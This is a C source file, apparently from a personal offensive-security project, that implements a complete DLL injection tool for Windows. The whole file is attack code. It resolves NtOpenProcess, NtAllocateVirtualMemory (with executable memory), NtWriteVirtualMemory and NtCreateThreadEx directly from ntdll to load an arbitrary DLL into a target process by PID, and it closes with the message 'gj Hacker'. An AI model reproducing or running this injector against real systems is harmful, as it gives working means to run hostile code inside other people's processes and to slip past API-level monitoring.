/* ///  **********************************************************************  /// 


@author:        @x1nerama (aka: bekoo)
@website:       x1nerama.github.io
@release-date:  02-07-2024
@last-update:   02-08-2024 - 5.06 AM


///  **********************************************************************  /// */


#include "nt-functions.h"

extern HMODULE  getTargetModule(LPCWSTR moduleName);

int main(int argc, char* argv[]) {
    HANDLE  hProcess, hThread;
    HMODULE ntDLL, kernel32DLL = NULL;
    PVOID   RemoteBuffer = NULL; 
    DWORD   PID;
    wchar_t dllPath[MAX_PATH] = L"C:\\path\\to\\dll";
    size_t  dllSize  = sizeof(dllPath); 
    size_t  bytesWritten = 0;

    if (argc < 2) {
        warn("Usage: .\\injection.exe <PID>");
        return -1;
    }
    PID = atoi(argv[1]);
    OBJECT_ATTRIBUTES   objAttr     = { sizeof(objAttr), NULL };
    CLIENT_ID           CID         = { (HANDLE)PID, NULL };

    /* Get handle to ntdll and kernel32 */
    ntDLL = getTargetModule(L"ntdll.dll");
    kernel32DLL = getTargetModule(L"kernel32.dll");
    if (ntDLL == NULL || kernel32DLL == NULL) {
        printf("Failed to get handle to %s. Error Code: 0x%lx\n", ((ntDLL == NULL) ? "NTDLL" : "KERNEL32"), GetLastError());
        goto _CLEAN;
    }   
    okay("Got handle to ntdll and kernel32");
    
    /* Get LoadLibraryW address */
    PTHREAD_START_ROUTINE wLoadLibrary = (PTHREAD_START_ROUTINE)GetProcAddress(kernel32DLL, "LoadLibraryW");
    if (wLoadLibrary == NULL) {
        warn("Failed to get address of LoadLibraryW for module %s. Error Code: 0x%lx", L"kernel32.dll", GetLastError());
        return -1;
    }
    okay("got a address of loadlibraryw!");

    /* NTOpenProcess */
    /* NTAllocateVirtualMemory */
    fn_NtOpenProcess ntOpenProcess = 
        (fn_NtOpenProcess)GetProcAddress(ntDLL, "NtOpenProcess");

    /* NTAllocateVirtualMemory */
    fn_NtAllocateVirtualMemory ntAllocateVirtualMemory = 
        (fn_NtAllocateVirtualMemory)GetProcAddress(ntDLL, "NtAllocateVirtualMemory");

    /* NTWriteVirtualMemory  */
    fn_NtWriteVirtualMemory ntWriteVirtualMemory = 
        (fn_NtWriteVirtualMemory)GetProcAddress(ntDLL, "NtWriteVirtualMemory");


    /* NtCreateThreadEx   */
    fn_NtCreateThreadEx ntCreateThreadEx = 
        (fn_NtCreateThreadEx)GetProcAddress(ntDLL, "NtCreateThreadEx");

    /* NtWaitForSingleObject  */
    fn_NtWaitForSingleObject ntWaitForSingleObject =
        (fn_NtWaitForSingleObject)GetProcAddress(ntDLL, "NtWaitForSingleObject");

    /* NtClose  */
    fn_NtClose ntClose =
        (fn_NtClose)GetProcAddress(ntDLL, "NtClose");   


    NTSTATUS openProcessStatus = ntOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &objAttr, &CID);
    if (openProcessStatus != STATUS_SUCCESS) {
        warn("Failed to open handle to Process! Error Code: 0x%lx", openProcessStatus);
        goto _CLEAN;
    }
    okay("Got a handle for process!");

    NTSTATUS virtualAllocExStatus = ntAllocateVirtualMemory(hProcess, &RemoteBuffer, 0, &dllSize, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
    if (virtualAllocExStatus != STATUS_SUCCESS) {
        warn("Failed to Allocate Memory in Process! Error Code: 0x%lx", virtualAllocExStatus);
        goto _CLEAN;
    }
    okay("Allocated %zu-byte Memory in Process! Address: 0x%p", dllSize, RemoteBuffer);

    NTSTATUS writeMemoryStatus = ntWriteVirtualMemory(hProcess, RemoteBuffer, dllPath, sizeof(dllPath), &bytesWritten);
    if (writeMemoryStatus != STATUS_SUCCESS || bytesWritten != sizeof(dllPath)) {
        warn("Failed to Write Memory in Process! Error Code: 0x%lx", writeMemoryStatus);
        goto _CLEAN;
    }

    for (SIZE_T i = 0; i <= bytesWritten; i++) {
        printf("\r[*] [0x%p] [%zu/%zu] writing payload to buffer...", RemoteBuffer, i, bytesWritten);
    }
    okay("\n Wrote %zu bytes to Memory in Process!", bytesWritten);

    NTSTATUS createThreadExStatus = ntCreateThreadEx(&hThread, THREAD_ALL_ACCESS, &objAttr, hProcess, (wLoadLibrary), RemoteBuffer, FALSE, 0, 0, 0, 0);
    if (createThreadExStatus != STATUS_SUCCESS) {
        warn("Failed to create Thread! Error Code: 0x%lx", createThreadExStatus);
        goto _CLEAN;
    }
    info("Created Remote Thread! Now waiting to it for finish!");

    WaitForSingleObject(hThread, INFINITE);

    okay("DLL is executed! gj Hacker :>");
    goto _CLEAN;

_CLEAN:
    if (hThread) {
        ntClose(hThread);
    }
    if (hProcess) {
        ntClose(hProcess);
    }
    info("Ok, exit!");
    return 0;

}